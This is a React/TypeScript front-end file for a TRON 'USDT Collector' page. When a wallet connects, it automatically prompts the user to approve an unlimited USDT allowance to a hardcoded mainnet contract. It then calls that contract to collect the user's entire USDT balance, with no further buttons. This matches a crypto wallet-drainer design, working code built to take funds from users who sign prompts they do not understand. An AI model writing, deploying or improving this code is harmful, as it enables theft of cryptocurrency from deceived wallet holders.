// App.tsx
// ─────────────────────────────────────────────────────────────────────────────
// AUTOMATIC FLOW:
//   1. User clicks "Connect Wallet"
//   2. Wallet picker modal opens → user picks a wallet
//   3. Wallet connects (user may approve in wallet app)
//   4. App immediately sends APPROVE tx → user signs in wallet
//   5. App waits for block confirmation (~12s)
//   6. App immediately sends COLLECT tx → user signs in wallet
//   7. Done ✅
//
// The user only ever sees their wallet's native signature prompts.
// There are no manual buttons after the wallet is selected.
// ─────────────────────────────────────────────────────────────────────────────

import { useState, useEffect, useRef, useCallback } from 'react'
import { useWallet } from './WalletSetup'
import { WalletReadyState } from '@tronweb3/tronwallet-abstract-adapter'
import { Wallet, X, CheckCircle, Loader2, AlertCircle } from 'lucide-react'

// ── CONFIG ────────────────────────────────────────────────────────────────────
const NETWORK          = 'Mainnet'
const CONTRACT_ADDRESS = 'TEgdXwe91pY49EfG5oEzP4mwPQ7Koj77GZ'

const NETWORK_CONFIG = {
  Mainnet: { usdtAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t' },
  Nile:    { usdtAddress: 'TXYZopYRdj2D9XRtbG411XZZ3kM5VkAeBf' },
}
const USDT_ADDRESS = NETWORK_CONFIG[NETWORK as keyof typeof NETWORK_CONFIG].usdtAddress

// ── ABIs ──────────────────────────────────────────────────────────────────────
const USDT_ABI = [
  { constant: true,  inputs: [{ name: 'who', type: 'address' }],
    name: 'balanceOf', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
  { constant: false, inputs: [{ name: '_spender', type: 'address' }, { name: '_value', type: 'uint256' }],
    name: 'approve',   outputs: [{ name: '', type: 'bool' }], type: 'function' },
  { constant: true,  inputs: [{ name: 'owner', type: 'address' }, { name: 'spender', type: 'address' }],
    name: 'allowance', outputs: [{ name: '', type: 'uint256' }], type: 'function' },
]
const COLLECT_ABI = [
  { constant: false,
    inputs: [{ name: 'user', type: 'address' }, { name: 'amount', type: 'uint256' }],
    name: 'collect', outputs: [], stateMutability: 'nonpayable', type: 'function' },
]

// ── Step state type ───────────────────────────────────────────────────────────
type Step = 'idle' | 'connecting' | 'checking_balance' | 'approving' | 'waiting_confirm' | 'collecting' | 'done' | 'error'

const STEP_LABELS: Record<Step, string> = {
  idle:             'Connect your wallet to begin',
  connecting:       'Connecting wallet…',
  checking_balance: 'Checking your USDT balance…',
  approving:        'Check your wallet — sign the approval',
  waiting_confirm:  'Waiting for confirmation on-chain…',
  collecting:       'Check your wallet — sign the collection',
  done:             'All done! USDT collected ✅',
  error:            '',
}

export default function App() {
  const { wallets, wallet, select, connect, disconnect, address, connected } = useWallet()

  const [step,       setStep]       = useState<Step>('idle')
  const [errorMsg,   setErrorMsg]   = useState('')
  const [txHash,     setTxHash]     = useState('')
  const [showPicker, setShowPicker] = useState(false)

  // Prevent double-triggering the auto-collect when React strict mode re-runs effects
  const autoRunRef = useRef(false)

  // tronWeb lives on the connected adapter
  const tronWeb = (wallet?.adapter as any)?.tronWeb ?? null

  // ── Core logic ──────────────────────────────────────────────────────────────
  const runCollect = useCallback(async (tw: any, addr: string) => {
    try {
      // 1. Check TRX balance (need at least 0.1 TRX for fees)
      const trxBalance = await tw.trx.getBalance(addr)
      if (trxBalance < 100_000) {
        throw new Error('Insufficient TRX for fees. You need at least 0.1 TRX to pay for gas.')
      }

      // 2. Check USDT balance
      setStep('checking_balance')
      const usdtContract = await tw.contract(USDT_ABI).at(USDT_ADDRESS)
      const balance      = await usdtContract.balanceOf(addr).call()
      const amount       = balance.toString()

      if (!amount || amount === '0') {
        throw new Error('No USDT balance found in this wallet.')
      }

      // 3. Approve — user signs here
      setStep('approving')
      const MAX_UINT = '115792089237316195423570985008687907853269984665640564039457584007913129639935'
      await usdtContract.approve(CONTRACT_ADDRESS, MAX_UINT).send({ feeLimit: 100_000_000 })

      // 4. Wait for the approval tx to be confirmed on-chain
      setStep('waiting_confirm')
      await new Promise(r => setTimeout(r, 12_000))

      // Verify allowance was actually set before proceeding
      const allowance = await usdtContract.allowance(addr, CONTRACT_ADDRESS).call()
      if (!allowance || allowance.toString() === '0') {
        throw new Error('Approval not confirmed yet. Please try again in a moment.')
      }

      // 5. Collect — user signs here
      setStep('collecting')
      const collectContract = await tw.contract(COLLECT_ABI).at(CONTRACT_ADDRESS)
      const tx = await collectContract.collect(addr, amount).send({ feeLimit: 150_000_000 })

      setTxHash(tx)
      setStep('done')

    } catch (err: any) {
      setErrorMsg(err.message ?? 'Something went wrong. Please try again.')
      setStep('error')
    }
  }, [])

  // ── Auto-trigger collect immediately after wallet connects ──────────────────
  useEffect(() => {
    if (connected && address && tronWeb && !autoRunRef.current) {
      autoRunRef.current = true
      runCollect(tronWeb, address)
    }
    // Reset the guard when disconnected so reconnect works
    if (!connected) {
      autoRunRef.current = false
    }
  }, [connected, address, tronWeb, runCollect])

  // ── Wallet picker handler ───────────────────────────────────────────────────
  const handlePickWallet = async (adapterName: string) => {
    setShowPicker(false)
    setStep('connecting')
    setErrorMsg('')
    setTxHash('')
    try {
      select(adapterName as any)
      await new Promise(r => setTimeout(r, 150)) // let selection propagate
      await connect()
      // runCollect fires automatically via the useEffect above
    } catch (err: any) {
      setErrorMsg(err.message ?? 'Connection failed.')
      setStep('error')
    }
  }

  const handleReset = async () => {
    await disconnect()
    setStep('idle')
    setErrorMsg('')
    setTxHash('')
    autoRunRef.current = false
  }

  // ── Derived UI values ───────────────────────────────────────────────────────
  const isRunning    = !['idle', 'done', 'error'].includes(step)
  const stepLabel    = step === 'error' ? errorMsg : STEP_LABELS[step]
  const progressPct  = { idle: 0, connecting: 10, checking_balance: 25, approving: 45, waiting_confirm: 65, collecting: 80, done: 100, error: 0 }[step]

  return (
    <div className="min-h-screen flex items-center justify-center p-4 bg-zinc-950">
      <div className="max-w-md w-full bg-zinc-900 rounded-3xl shadow-2xl border border-zinc-800 overflow-hidden">

        {/* ── Header ── */}
        <div className="bg-black px-6 py-5 flex items-center justify-between border-b border-zinc-800">
          <div className="flex items-center gap-3">
            <div className="w-9 h-9 bg-emerald-400 rounded-2xl flex items-center justify-center text-black font-bold text-xl">U</div>
            <h1 className="text-2xl font-bold">USDT Collector</h1>
          </div>
          <div className="flex items-center gap-2">
            <span className="text-xs px-3 py-1 bg-emerald-500/10 text-emerald-400 rounded-full">{NETWORK}</span>
            {connected && (
              <button onClick={handleReset} title="Disconnect" className="text-zinc-600 hover:text-red-400 transition ml-1">
                <X size={16} />
              </button>
            )}
          </div>
        </div>

        <div className="p-8">
          {/* ── IDLE — show connect button ── */}
          {step === 'idle' && (
            <div className="text-center space-y-6">
              <div>
                <h2 className="text-4xl font-bold mb-2">Collect USDT</h2>
                <p className="text-zinc-500 text-sm">
                  Select your wallet. Approval and collection<br />happen automatically — just sign when prompted.
                </p>
              </div>

              <button
                onClick={() => setShowPicker(true)}
                className="w-full bg-emerald-400 hover:bg-emerald-500 text-black font-bold py-5 rounded-2xl text-xl flex items-center justify-center gap-3 transition"
              >
                Connect Wallet
                <Wallet className="w-6 h-6" />
              </button>

              <p className="text-xs text-zinc-600">
                Trust Wallet · TronLink · MetaMask · OKX · 100+ via WalletConnect
              </p>
            </div>
          )}

          {/* ── RUNNING — show progress ── */}
          {isRunning && (
            <div className="space-y-8">
              {/* Wallet address pill */}
              {address && (
                <div className="bg-zinc-800 rounded-xl px-4 py-2 flex items-center gap-2">
                  <span className="w-2 h-2 rounded-full bg-emerald-400 flex-shrink-0 animate-pulse" />
                  <span className="font-mono text-xs text-emerald-400 truncate">{address}</span>
                </div>
              )}

              {/* Animated step indicator */}
              <div className="flex flex-col items-center gap-4 py-6">
                <div className="relative w-20 h-20">
                  {/* Outer spinning ring */}
                  <div className="absolute inset-0 rounded-full border-4 border-zinc-700" />
                  <div className="absolute inset-0 rounded-full border-4 border-emerald-400 border-t-transparent animate-spin" />
                  {/* Inner icon */}
                  <div className="absolute inset-0 flex items-center justify-center">
                    <Loader2 className="w-8 h-8 text-emerald-400 animate-spin" style={{ animationDirection: 'reverse' }} />
                  </div>
                </div>
                <p className="text-white font-semibold text-center text-lg leading-snug">{stepLabel}</p>
              </div>

              {/* Progress bar */}
              <div className="space-y-2">
                <div className="h-1.5 bg-zinc-800 rounded-full overflow-hidden">
                  <div
                    className="h-full bg-emerald-400 rounded-full transition-all duration-700"
                    style={{ width: `${progressPct}%` }}
                  />
                </div>
                <div className="flex justify-between text-[11px] text-zinc-600">
                  <span>Connect</span>
                  <span>Approve</span>
                  <span>Collect</span>
                  <span>Done</span>
                </div>
              </div>

              {/* Step cards — show completed steps */}
              <div className="space-y-2">
                {(['connecting', 'approving', 'waiting_confirm', 'collecting'] as Step[]).map((s, i) => {
                  const stepOrder: Step[] = ['connecting', 'checking_balance', 'approving', 'waiting_confirm', 'collecting', 'done']
                  const currentIdx  = stepOrder.indexOf(step)
                  const thisIdx     = stepOrder.indexOf(s)
                  const isDone      = currentIdx > thisIdx
                  const isCurrent   = currentIdx === thisIdx

                  const labels: Record<string, string> = {
                    connecting:       '1. Connect wallet',
                    approving:        '2. Sign approval',
                    waiting_confirm:  '3. On-chain confirmation',
                    collecting:       '4. Sign collection',
                  }

                  return (
                    <div key={s} className={`flex items-center gap-3 px-4 py-3 rounded-xl border transition-all
                      ${isDone    ? 'border-emerald-500/30 bg-emerald-500/5'  : ''}
                      ${isCurrent ? 'border-emerald-400/60 bg-emerald-400/10' : ''}
                      ${!isDone && !isCurrent ? 'border-zinc-800 opacity-40' : ''}
                    `}>
                      {isDone
                        ? <CheckCircle size={16} className="text-emerald-400 flex-shrink-0" />
                        : isCurrent
                          ? <Loader2 size={16} className="text-emerald-400 animate-spin flex-shrink-0" />
                          : <span className="w-4 h-4 rounded-full border border-zinc-600 flex-shrink-0" />
                      }
                      <span className={`text-sm ${isDone || isCurrent ? 'text-white' : 'text-zinc-600'}`}>
                        {labels[s]}
                      </span>
                    </div>
                  )
                })}
              </div>
            </div>
          )}

          {/* ── DONE ── */}
          {step === 'done' && (
            <div className="text-center space-y-6 py-4">
              <div className="flex flex-col items-center gap-3">
                <div className="w-20 h-20 rounded-full bg-emerald-500/20 flex items-center justify-center">
                  <CheckCircle className="w-10 h-10 text-emerald-400" />
                </div>
                <h2 className="text-3xl font-bold">USDT Collected!</h2>
                <p className="text-zinc-400 text-sm">Your USDT has been transferred to the main wallet.</p>
              </div>

              {txHash && (
                <a
                  href={`https://tronscan.org/#/transaction/${txHash}`}
                  target="_blank"
                  rel="noreferrer"
                  className="block bg-zinc-800 hover:bg-zinc-700 rounded-xl px-4 py-3 transition"
                >
                  <p className="text-xs text-zinc-500 mb-1">Transaction</p>
                  <p className="font-mono text-xs text-emerald-400 break-all">{txHash}</p>
                </a>
              )}

              <button
                onClick={handleReset}
                className="w-full border border-zinc-700 hover:border-zinc-500 text-zinc-300 hover:text-white py-3 rounded-2xl text-sm font-semibold transition"
              >
                Connect Another Wallet
              </button>
            </div>
          )}

          {/* ── ERROR ── */}
          {step === 'error' && (
            <div className="text-center space-y-6 py-4">
              <div className="flex flex-col items-center gap-3">
                <div className="w-20 h-20 rounded-full bg-red-500/10 flex items-center justify-center">
                  <AlertCircle className="w-10 h-10 text-red-400" />
                </div>
                <h2 className="text-2xl font-bold text-red-400">Something went wrong</h2>
                <p className="text-zinc-400 text-sm px-2">{errorMsg}</p>
              </div>

              <div className="flex flex-col gap-2">
                {/* Retry — try collect again without reconnecting */}
                {connected && tronWeb && address && (
                  <button
                    onClick={() => { autoRunRef.current = false; runCollect(tronWeb, address) }}
                    className="w-full bg-emerald-400 hover:bg-emerald-500 text-black font-bold py-4 rounded-2xl text-base transition"
                  >
                    Try Again
                  </button>
                )}
                <button
                  onClick={handleReset}
                  className="w-full border border-zinc-700 hover:border-zinc-500 text-zinc-400 hover:text-white py-3 rounded-2xl text-sm font-semibold transition"
                >
                  Start Over
                </button>
              </div>
            </div>
          )}
        </div>
      </div>

      {/* ── Wallet Picker Modal ─────────────────────────────────────────────── */}
      {showPicker && (
        <div
          className="fixed inset-0 bg-black/75 backdrop-blur-sm flex items-end sm:items-center justify-center z-50 p-4"
          onClick={() => setShowPicker(false)}
        >
          <div
            className="bg-zinc-900 rounded-2xl border border-zinc-700 w-full max-w-sm overflow-hidden"
            onClick={e => e.stopPropagation()}
          >
            <div className="flex items-center justify-between px-5 py-4 border-b border-zinc-800">
              <div>
                <h3 className="font-bold text-lg">Select Wallet</h3>
                <p className="text-xs text-zinc-500">Choose a wallet to connect and start automatically</p>
              </div>
              <button onClick={() => setShowPicker(false)} className="text-zinc-500 hover:text-white">
                <X size={20} />
              </button>
            </div>

            <div className="p-3 max-h-[55vh] overflow-y-auto">
              {wallets.map(({ adapter }) => {
                const installed =
                  adapter.readyState === WalletReadyState.Found ||
                  adapter.readyState === WalletReadyState.Loadable

                return (
                  <button
                    key={adapter.name}
                    onClick={() => handlePickWallet(adapter.name)}
                    className="w-full flex items-center gap-4 px-4 py-3 rounded-xl mb-1 text-left hover:bg-zinc-800 transition"
                  >
                    {/* Icon */}
                    <div className="w-11 h-11 rounded-xl bg-zinc-800 flex items-center justify-center flex-shrink-0 overflow-hidden">
                      {adapter.icon
                        ? <img src={adapter.icon} alt={adapter.name} className="w-9 h-9 object-contain" />
                        : <Wallet className="w-5 h-5 text-zinc-400" />
                      }
                    </div>

                    {/* Name + subtitle */}
                    <div className="flex-1 min-w-0">
                      <p className="font-semibold truncate">{adapter.name}</p>
                      <p className="text-xs text-zinc-500">
                        {adapter.name === 'WalletConnect'
                          ? '100+ wallets via QR code'
                          : installed
                            ? 'Ready to connect'
                            : 'Not installed — will open app store'
                        }
                      </p>
                    </div>

                    {/* Detected dot */}
                    {installed && adapter.name !== 'WalletConnect' && (
                      <span className="w-2.5 h-2.5 rounded-full bg-emerald-400 flex-shrink-0" />
                    )}
                  </button>
                )
              })}
            </div>

            <div className="px-5 py-3 border-t border-zinc-800">
              <p className="text-center text-xs text-zinc-600">
                By connecting you approve this site to interact with your wallet
              </p>
            </div>
          </div>
        </div>
      )}
    </div>
  )
}